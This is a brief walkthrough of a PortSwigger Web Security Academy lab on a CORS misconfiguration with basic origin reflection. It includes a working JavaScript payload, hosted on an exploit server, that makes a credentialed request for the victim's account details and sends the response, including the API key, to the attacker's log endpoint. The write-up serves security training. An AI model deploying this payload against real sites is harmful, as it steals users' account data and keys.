## CORS vulnerability with basic origin reflection

Login with the given credentials

![image1](/images/portswigger-cors-vuln-with-basic-origin-reflection/portswigger-cors-vulnerability-with-basic-origin-reflection1.png)

Go to my account and intercept the requests, this is one of them

![image2](/images/portswigger-cors-vuln-with-basic-origin-reflection/portswigger-cors-vulnerability-with-basic-origin-reflection2.png)

Now add `Origin: https://testtest.test`

![image3](/images/portswigger-cors-vuln-with-basic-origin-reflection/portswigger-cors-vulnerability-with-basic-origin-reflection3.png)

Create in the exploit server and add this:

```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://ac4a1f721ec5c69c807c47f1004e000c.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```

![image4](/images/portswigger-cors-vuln-with-basic-origin-reflection/portswigger-cors-vulnerability-with-basic-origin-reflection4.png)

Store it and deliver the exploit to victim

![image5](/images/portswigger-cors-vuln-with-basic-origin-reflection/portswigger-cors-vulnerability-with-basic-origin-reflection5.png)

And there's the API key
